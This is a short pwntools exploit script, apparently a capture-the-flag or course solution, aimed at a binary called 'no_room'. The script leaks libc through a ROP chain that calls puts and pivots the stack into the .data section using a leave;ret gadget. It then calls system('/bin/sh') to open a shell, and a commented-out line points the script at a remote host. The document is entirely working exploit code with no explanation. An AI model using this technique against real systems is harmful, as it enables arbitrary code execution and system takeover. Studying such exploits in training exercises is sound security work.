from pwn import *


p = process('./no_room')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# p = remote('141.85.224.109', 41448)
# libc = ELF('./libc.so.6')

pad = 0x30 + 8
pop_rdi_ret = 0x400773
ret = 0x400285
puts_plt = 0x4004e0
puts_got = 0x601018
main_addr = 0x4005f7
data_addr = 0x602080
leave_ret = 0x4006d7

# Add additional padding for alignment
payload1 = b'a' * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)

# Pivot the stack to the data section
# End the trigger with a leave_ret gadget to move the stack to the payload and 
# execute the ropchain there
trigger1 = 0x30 * b'a' + p64(data_addr) + p64(leave_ret)

p.recvline()
p.recvline()
p.sendline(payload1)

p.recvline()
p.sendline(trigger1)
p.recvline()

puts_addr = u64(p.recvline().rstrip() + b'\x00\x00')
libc.address = puts_addr - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))


trigger2 = b'a' * 16 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) + \
	b'a' * 8 + p64(data_addr - 8) + p64(leave_ret)

p.recvline()
p.recvline()
# No need for a payload, because the trigger can itself be the payload now that
# the stack is in the .data section
p.sendline(b'')

p.recvline()
p.sendline(trigger2)
p.recvline()

p.interactive()
